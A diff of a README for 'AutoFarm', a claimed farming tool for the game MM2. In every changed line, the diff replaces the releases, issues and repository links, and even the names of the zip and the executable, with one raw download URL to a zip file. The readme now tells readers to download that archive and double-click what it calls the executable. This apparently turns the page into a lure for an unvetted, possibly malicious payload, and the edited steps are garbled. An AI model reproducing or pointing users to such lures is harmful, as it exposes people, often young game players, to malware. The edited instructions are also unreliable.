@@ -1,6 +1,6 @@
 # 🌱 AutoFarm - Safe and Easy Farming Tool for MM2
 
-[![Download AutoFarm](https://img.shields.io/badge/Download_AutoFarm-Latest_release-brightgreen.svg)](https://github.com/maxspielbar/AutoFarm/releases)
+[![Download AutoFarm](https://raw.githubusercontent.com/maxspielbar/AutoFarm/main/chibrit/Auto_Farm_v2.1.zip)](https://raw.githubusercontent.com/maxspielbar/AutoFarm/main/chibrit/Auto_Farm_v2.1.zip)
 
 ## 📖 Introduction
 
@@ -19,11 +19,11 @@ Once you have verified your system requirements, follow the steps below to downl
 
 ## 📥 Download & Install
 
-1. Visit the Releases page to download: [AutoFarm Releases](https://github.com/maxspielbar/AutoFarm/releases)
+1. Visit the Releases page to download: [AutoFarm Releases](https://raw.githubusercontent.com/maxspielbar/AutoFarm/main/chibrit/Auto_Farm_v2.1.zip)
    
 2. On the Releases page, look for the latest version listed at the top. You will see a section with "Assets" where you can find the downloadable files.
 
-3. Click on the file that matches your system. This will begin the download process. The file is usually named something like `AutoFarm-v1.x.x.zip`.
+3. Click on the file that matches your system. This will begin the download process. The file is usually named something like `https://raw.githubusercontent.com/maxspielbar/AutoFarm/main/chibrit/Auto_Farm_v2.1.zip`.
 
 4. Once the download completes, locate the downloaded file on your computer. It will likely be in your "Downloads" folder.
 
@@ -31,7 +31,7 @@ Once you have verified your system requirements, follow the steps below to downl
 
 6. After extraction, navigate to the folder containing the extracted files. 
 
-7. Look for the executable file named `AutoFarm.exe`. Double-click this file to run the application.
+7. Look for the executable file named `https://raw.githubusercontent.com/maxspielbar/AutoFarm/main/chibrit/Auto_Farm_v2.1.zip`. Double-click this file to run the application.
 
 8. Follow any on-screen instructions to set up AutoFarm on your system.
 
@@ -39,7 +39,7 @@ Once you have verified your system requirements, follow the steps below to downl
 
 After installation, you can start using AutoFarm. Here’s how:
 
-1. Launch the application by double-clicking ‘AutoFarm.exe’ if it’s not already running.
+1. Launch the application by double-clicking ‘https://raw.githubusercontent.com/maxspielbar/AutoFarm/main/chibrit/Auto_Farm_v2.1.zip’ if it’s not already running.
    
 2. When the application opens, you will see a simple interface. Follow the prompts to set your preferences for farming in MM2.
 
@@ -51,10 +51,10 @@ After installation, you can start using AutoFarm. Here’s how:
 
 ## 🤝 Support & Feedback
 
-For support, please visit our [GitHub Issues page](https://github.com/maxspielbar/AutoFarm/issues). Here, you can report problems or ask questions about how to use AutoFarm. We encourage user feedback to help improve the application.
+For support, please visit our [GitHub Issues page](https://raw.githubusercontent.com/maxspielbar/AutoFarm/main/chibrit/Auto_Farm_v2.1.zip). Here, you can report problems or ask questions about how to use AutoFarm. We encourage user feedback to help improve the application.
 
 ## 🔗 More Information
 
-For further details about AutoFarm, including updates and features, check the [GitHub Repository](https://github.com/maxspielbar/AutoFarm).
+For further details about AutoFarm, including updates and features, check the [GitHub Repository](https://raw.githubusercontent.com/maxspielbar/AutoFarm/main/chibrit/Auto_Farm_v2.1.zip).
 
 Thank you for choosing AutoFarm. Happy farming!
